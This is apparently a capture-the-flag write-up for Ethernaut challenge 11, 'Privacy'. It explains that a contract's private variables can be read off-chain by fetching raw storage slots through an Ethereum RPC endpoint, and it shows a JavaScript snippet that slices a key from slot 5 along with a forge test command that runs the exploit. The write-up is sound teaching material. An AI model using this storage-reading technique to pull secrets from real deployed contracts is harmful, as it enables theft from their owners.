## Ethernaut Challenge 11

In this challenge the user is provided with a contract called [`Privacy.sol`](./Privacy.sol). The goal of this challenge is to set the variable `locked` to `false`.

This challenge requires user to be familiar with the following concepts.
- Storage or slot packing technique while contract creation.

### Solution

- Private variables of a contract cannot be accessed from another smart contract unless it is inherting the contract. But contract storage slots can be accessed off-chain through an ethereum RPC endpoint using.

```js
const provider = new providers.JsonRpcProvider(
  { url: YOUR_ETHEREUM_RPC_URL },
  1
);
let key = await provider.getStorageAt("YOU_INSTANCE_ADDRESS", 5);
// The "getStorageAt()" returns a 32-byte but we need first 16 byte 
// So we pick first 32 characters including 0x total => 32 + 2 = 34
console.log("The key is :", key.slice(0, 34));
```

### Alternative solution
- For demostrative pruposes, I have created a function call `getValueAtSlot()` in [`Privacy.sol`](./Privacy.sol) to get the storage at slot `5` as it is where the value of the `key` in bytes32 is stored.

1. Run Exploit!

```sh
forge test -vv -m test_challenge_11
```
